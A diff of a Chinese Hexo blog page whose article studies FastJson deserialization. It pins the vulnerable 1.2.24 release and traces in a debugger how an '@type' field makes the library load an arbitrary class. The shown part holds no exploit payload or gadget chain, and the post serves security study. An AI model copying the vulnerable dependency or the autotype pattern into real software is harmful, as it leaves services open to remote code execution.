-<link rel="stylesheet" href="/css/style.css">
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://bu.dusays.com/2024/03/05/65e6c6003a571.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
 
-
-    
-        
-<link rel="stylesheet" href="/assets/build/styles.css">
-
-    
-
-    
-<link rel="stylesheet" href="/fonts/fonts.css">
-
-    
-<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
-
-    
-<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
-
-    <!--- Font Part-->
-    
-    
-    
-    
-
-    <!--- Inject Part-->
-    
-    <script id="hexo-configurations">
-    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"stoocea blog","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
-    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
-    window.data = {"masonry":false};
-  </script>
-    
-    <!--- Fontawesome Part-->
-    
-<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/brands.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/solid.min.css">
-
-    
-<link rel="stylesheet" href="/fontawesome/regular.min.css">
-
-    
-    
-    
-    
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-
-<body>
-<div class="progress-bar-container">
-    
-
-    
-        <span class="pjax-progress-bar"></span>
-        <span class="swup-progress-icon">
-            <i class="fa-solid fa-circle-notch fa-spin"></i>
-        </span>
-    
-</div>
-
-
-<main class="page-container" id="swup">
-
-    
-
-    <div class="main-content-container">
-
-
-        <div class="main-content-header">
-            <header class="navbar-container">
-    
-    <div class="navbar-content">
-        <div class="left">
-            
-            <a class="logo-title" href="/">
-                
-                stoocea blog
-                
-            </a>
-        </div>
-
-        <div class="right">
-            <!-- PC -->
-            <div class="desktop">
-                <ul class="navbar-list">
-                    
-                        
-                            <li class="navbar-item">
-                                <!-- Menu -->
-                                <a class="" 
-                                    href="/"  >
-                                    
-                                        
-                                            <i class="fa-regular fa-house"></i>
-                                        
-                                        首页
-                                    
-                                </a>
-                                <!-- Submenu -->
-                                
-                            </li>
-                    
-                    
-                </ul>
-            </div>
-            <!-- Mobile -->
-            <div class="mobile">
-                
-                <div class="icon-item navbar-bar">
-                    <div class="navbar-bar-middle"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Mobile drawer -->
-    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
-        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
-            
-                
-                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
-                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
-                        href="/"  >
-                             
-                                
-                                    <i class="fa-regular fa-house"></i>
-                                
-                                首页
-                            
-                        </a>
-                    </li>
-                    <!-- Submenu -->
-                    
-            
-
-        </ul>
-    </div>
-
-    <div class="window-mask"></div>
-
-</header>
-
-
-        </div>
-
-        <div class="main-content-body">
-
-            
-
-            <div class="main-content">
-
-                
-                    <div class="post-page-container">
-    <div class="article-content-container">
-
-        <div class="article-title relative w-full">
-            
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">FastJson反序列化学习</h1>
-                </div>
-            
-            </div>
-
-        
-            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="https://stoocea.github.io/images/rj3.jpg">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">stoocea</span>
-                        
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2023-11-10 11:09:51</span>
-        <span class="mobile">2023-11-10 11:09:51</span>
-        <span class="hover-info">创建</span>
-    </span>
-    
-        <span class="article-date article-meta-item">
-            <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-11-12 11:33:35</span>
-            <span class="mobile">2023-11-12 11:33:35</span>
-            <span class="hover-info">更新</span>
-        </span>
-    
-
-    
-    
-
-    
-    
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
-</div>
-
-                    </div>
-                </div>
-            </div>
-        
-
-        
-
-
-        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <p>首先是准备的maven依赖<br>1.2.24是最开始FastJson爆出来的漏洞的那个版本</p>
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">stoocea</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">FastJson反序列化学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-11-10T03:09:51.000Z" title="发表于 2023-11-10 11:09:51">2023-11-10</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-11-12T03:33:35.369Z" title="更新于 2023-11-12 11:33:35">2023-11-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><article class="post-content" id="article-container" itemscope itemtype="http://example.com/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"><header><h1 id="CrawlerTitle" itemprop="name headline">FastJson反序列化学习</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">stoocea</span><time itemprop="dateCreated datePublished" datetime="2023-11-10T03:09:51.000Z" title="发表于 2023-11-10 11:09:51">2023-11-10</time><time itemprop="dateCreated datePublished" datetime="2023-11-12T03:33:35.369Z" title="更新于 2023-11-12 11:33:35">2023-11-12</time></header><p>首先是准备的maven依赖<br>1.2.24是最开始FastJson爆出来的漏洞的那个版本</p>
 <pre><code class="xml">&lt;dependency&gt;  
 &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  
 &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  
 &lt;version&gt;1.2.24&lt;/version&gt;  
 &lt;/dependency&gt;
 </code></pre>
-<p>本次学习结合组长的视频以及各师傅的博客<br><a class="link" target="_blank" rel="noopener" href="https://goodapple.top/archives/832">https://goodapple.top/archives/832 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link" target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link" target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning">https://github.com/Drun1baby/JavaSecurityLearning <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>本次学习结合组长的视频以及各师傅的博客<br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/832">https://goodapple.top/archives/832</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning">https://github.com/Drun1baby/JavaSecurityLearning</a></p>
 <h2 id="1-FastJson概述"><a href="#1-FastJson概述" class="headerlink" title="1.FastJson概述"></a>1.FastJson概述</h2><p>在学习FastJson的安全漏洞之前，我们首先得了解一下什么是FastJson？</p>
 <blockquote>
 <p>Fastjson是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Object 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 Java Object</p>
@@ -412,7 +288,7 @@ System.out.println(o3);
 &#125;
 </code></pre>
 <p>作用结果如下</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/1.png">)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/1.png">)</p>
 <p>能够正常调用Person对象里面的方法。<br>进一步的分析，这次我们给Person对象内写入构造方法 然后给每一个调用方法写一个sout来标识它的调用</p>
 <pre><code class="java">import com.alibaba.fastjson.JSON;  
 public class Fastjson_Learning &#123;  
@@ -450,7 +326,7 @@ System.out.println(o3.getName());
 &#125;  
 &#125;
 </code></pre>
-<p>结果如下<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/2.png">)</p>
+<p>结果如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/2.png">)</p>
 <p>发现FastJson的反序列化过程是通过调用指定javabean的set方法去对参数赋值，而不是反射之类，期间也会调用构造方法<br>直到现在都没啥问题，也没有什么漏洞点，但是FastJson提供了一种可以任意反序列化类的方式</p>
 <h3 id="FastJson根据字符串任意反序列化"><a href="#FastJson根据字符串任意反序列化" class="headerlink" title="FastJson根据字符串任意反序列化"></a>FastJson根据字符串任意反序列化</h3><pre><code class="java">public class Fastjson_Learning &#123;  
 public static void main(String[] args) &#123;
@@ -460,7 +336,7 @@ System.out.println(o3.getName());
 &#125;  
 &#125;
 </code></pre>
-<p>假如说我们在JSON数据中加入”@type”字段，我们就可以指定加载任意类了 比如说这里的org.example.Person就是指定的地址<br>效果图如下<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/3.png">)</p>
+<p>假如说我们在JSON数据中加入”@type”字段，我们就可以指定加载任意类了 比如说这里的org.example.Person就是指定的地址<br>效果图如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/3.png">)</p>
 <p>发现不论是执行set方法还是我们自己指定的get方法，都是可以正常执行的，而且constructor构造方法也能执行，这个时候就嗅到一丝味道了，我们客户端能够控制输入，并且服务端能够根据传入的数据执行不同的代码逻辑，就很像是一句话木马的意思，我们跟进他的具体方法内容以及流程分析一下</p>
 <h2 id="FastJson反序列化流程分析"><a href="#FastJson反序列化流程分析" class="headerlink" title="FastJson反序列化流程分析"></a>FastJson反序列化流程分析</h2><p>如果说选择指定加载的对象类型，跟进到parseObejct方法，流程回不一样，但处理的类都是差不多的，这里我们选择用单字符串的加载，就是仅加载我们客户端指定的对象</p>
 <pre><code class="java">
@@ -475,15 +351,15 @@ System.out.println(o3);
 &#125;
 &#125;
 </code></pre>
-<h3 id="type指定加载类"><a href="#type指定加载类" class="headerlink" title="@type指定加载类"></a>@type指定加载类</h3><p>在JSON.parseObject行下个断点，然后跟进去<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/4.png">)<br>来到JSON类的parseObject方法，他这里会继续调用parse方法，继续跟进</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/5.png">)<br>稍显套娃<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/7.png">)</p>
+<h3 id="type指定加载类"><a href="#type指定加载类" class="headerlink" title="@type指定加载类"></a>@type指定加载类</h3><p>在JSON.parseObject行下个断点，然后跟进去<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/4.png">)<br>来到JSON类的parseObject方法，他这里会继续调用parse方法，继续跟进</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/5.png">)<br>稍显套娃<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/7.png">)</p>
 <p>两个parse方法紧挨着，当调用到第二个parse方法时，开始调用DefaultJSONParser类的构造方法，也就是获取到一个解析器去解析我们传过来的JSON数据<br>具体构造就不看了，我们跟进到下面的parser.parse方法调用</p>
-<p>来到DefaultJSONParser类的parse方法,这里就会将我们的传过来的json字符串<br><code>&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;ttt\&quot;&#125;</code><br>从左往右一个一个字符去解析<br> 比如第一个是{ 左大括号 ,那就调用到 LBRACE的内容<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/8.png">)</p>
+<p>来到DefaultJSONParser类的parse方法,这里就会将我们的传过来的json字符串<br><code>&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;ttt\&quot;&#125;</code><br>从左往右一个一个字符去解析<br> 比如第一个是{ 左大括号 ,那就调用到 LBRACE的内容<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/8.png">)</p>
 <p>先是实例化一个左大括号的JSON对象,然后返回 parseObject方法调用结果,继续跟进</p>
-<p>由于接下来的parseObject内容过多,只截取部分关键代码记录过程<br>刚进方法的时候,先把我们传进来的字符串转化为一个对象,该对象的类型是一个键值对（JSON格式）<br>然后就是边界的确定和检测，之后就开始一个字符一个字符的进行加载<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/9.png">)</p>
-<p>说它代码量较多的原因就是因为下面的try—catch的内容<br>先截取一部分理解<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/10.png">)</p>
-<p>这里有一个for的死循环，他里面的内容必须要有return或者break才能出来，这里调试的时候并没有循环很多次，一次出来，其实这个for循环的作用是根据”,”来给JSON分类，也就是对JSON数据处理，下面会对区分的部分进行匹配<br>就比如说for循环出来之后他就匹配到第一个” “里面的内容 @tpye字符，将他获取出来<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/11.png">)</p>
-<p>之后继续跟进到如下地方<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/12.png">)</p>
+<p>由于接下来的parseObject内容过多,只截取部分关键代码记录过程<br>刚进方法的时候,先把我们传进来的字符串转化为一个对象,该对象的类型是一个键值对（JSON格式）<br>然后就是边界的确定和检测，之后就开始一个字符一个字符的进行加载<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/9.png">)</p>
+<p>说它代码量较多的原因就是因为下面的try—catch的内容<br>先截取一部分理解<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/10.png">)</p>
+<p>这里有一个for的死循环，他里面的内容必须要有return或者break才能出来，这里调试的时候并没有循环很多次，一次出来，其实这个for循环的作用是根据”,”来给JSON分类，也就是对JSON数据处理，下面会对区分的部分进行匹配<br>就比如说for循环出来之后他就匹配到第一个” “里面的内容 @tpye字符，将他获取出来<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/11.png">)</p>
+<p>之后继续跟进到如下地方<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/12.png">)</p>
 <p>这边会首先进行一个判断，是否为<code>JSON.DEFAULT_TYPE_KEY</code>  其实这个就是”@type”<br>所以进入该if语句的内容，关键点肯定是这个loadClass，我们跟进<br>内容较多，总结一下功能实现：<br>先判断我们传进来的className是否为空，或者是否存在，然后进行下一步</p>
 <pre><code class="java">if (className == null || className.length() == 0) &#123;  
 return null;  
@@ -510,19 +386,19 @@ return clazz;
 </code></pre>
 <p>需要注意的是，这一步确实是加载到了指定的类，但是类里面我们指定的属性值还没有赋值进去，所以之后还需要经过一层FastJson特有的反序列化操作将这些事情做完</p>
 <h3 id="对指定类的参数处理"><a href="#对指定类的参数处理" class="headerlink" title="对指定类的参数处理"></a>对指定类的参数处理</h3><p>继续调试跟进来到这部分处理，也就是@type指定加载类之后，我们后续的对于类中属性值如何赋值的流程</p>
-<h4 id="获取构造器"><a href="#获取构造器" class="headerlink" title="获取构造器"></a>获取构造器</h4><p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/13.png">)</p>
+<h4 id="获取构造器"><a href="#获取构造器" class="headerlink" title="获取构造器"></a>获取构造器</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/13.png">)</p>
 <p><code>config.getDeserializer</code><br>首先根据我们刚才加载到的calzz来获取一个解析器<br><code>deserializer.deserialze</code><br>然后调用该解析器的deserialze方法</p>
-<p>我们首先来看解析器的获取<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/14.png">)</p>
-<p>他这里其实也有一个本地缓存的解析器获取的过程，其实就是在本地写了一些put操作，把可能用到的解析器都put到derializers中，这是我们自己定义的类，肯定是没有的，我们跟进到下面的getDeserializer方法<br>只提几点需要注意的：<br>这里有一个获取java注解的功能，相当于自己写一个解析器的功能，但是基本上用不到，因为控制端不在客户端，我们无法控制<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/15.png">)</p>
-<p>然后会进入一个for循环去匹配他的黑名单，这里的黑名单不是对FastJson反序列化攻击的waf，而是有些bug限制，或者说是性能上的限制<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/16.png">)</p>
-<p>最后的时候，经过一些列的if判断，会调用到createJavaBeanDeserializer这个方法来创建一个javaBean的解析器来对我们的指定类进行反序列化<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/17.png">)</p>
+<p>我们首先来看解析器的获取<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/14.png">)</p>
+<p>他这里其实也有一个本地缓存的解析器获取的过程，其实就是在本地写了一些put操作，把可能用到的解析器都put到derializers中，这是我们自己定义的类，肯定是没有的，我们跟进到下面的getDeserializer方法<br>只提几点需要注意的：<br>这里有一个获取java注解的功能，相当于自己写一个解析器的功能，但是基本上用不到，因为控制端不在客户端，我们无法控制<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/15.png">)</p>
+<p>然后会进入一个for循环去匹配他的黑名单，这里的黑名单不是对FastJson反序列化攻击的waf，而是有些bug限制，或者说是性能上的限制<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/16.png">)</p>
+<p>最后的时候，经过一些列的if判断，会调用到createJavaBeanDeserializer这个方法来创建一个javaBean的解析器来对我们的指定类进行反序列化<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/17.png">)</p>
 <p>继续跟进就行<br>对于createJavaBeanDeserializer方法来说，前面很多内容都是关于asm能不能用的判断，跟我们这次反序列化调试流程没有太大关系，我们直接跳到关键步骤</p>
-<p>来到下一个步骤 调用JavaBeanInfo.build方法，这是一个比较关键的方法，指定对象中的属性值和构造方法就是在这里被访问的<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/18.png">)</p>
